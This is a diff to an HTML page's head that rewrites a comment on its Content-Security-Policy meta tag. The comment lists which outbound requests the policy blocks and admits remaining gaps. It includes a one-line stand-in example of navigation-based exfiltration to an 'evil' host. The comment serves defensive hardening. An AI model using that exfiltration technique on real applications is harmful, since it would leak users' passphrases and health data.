@@ -4,15 +4,16 @@
   <meta charset="UTF-8">
   <!--
     Content-Security-Policy (defense-in-depth). The app is 100% same-origin, so
-    default-src/connect-src 'self' block ALL outbound network access: even if a
-    script is injected (e.g. via a malicious browser extension or DOM clobbering),
-    it cannot exfiltrate a passphrase or PHI to an external server, and remote
-    <script> sources are refused outright. 'unsafe-inline' is still required (the
-    UI uses inline onclick handlers and styles throughout — a strict nonce policy
-    would need those refactored out first); 'wasm-unsafe-eval' is required to
-    compile the bundled sql.js WebAssembly. NOTE: frame-ancestors / HSTS cannot be
-    set via <meta> — set them as HTTP headers at your host for clickjacking and
-    transport hardening.
+    default-src/connect-src/img-src 'self' block outbound network REQUESTS (fetch,
+    XHR, sendBeacon, image beacons): even if a script is injected (malicious
+    extension, DOM clobbering, prototype pollution), it cannot phone a stolen
+    passphrase or PHI home that way, and remote <script> sources are refused.
+    CAVEAT: 'unsafe-inline' is still required (the UI uses inline onclick handlers
+    + styles throughout), so an injected inline script can still RUN — and CSP
+    cannot block top-level NAVIGATION exfil (window.location = 'evil?k=…'); closing
+    both needs dropping 'unsafe-inline' via a nonce refactor of the inline handlers.
+    'wasm-unsafe-eval' is required to compile the bundled sql.js WebAssembly.
+    frame-ancestors / HSTS can't be set via <meta> — use HTTP headers at your host.
   -->
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
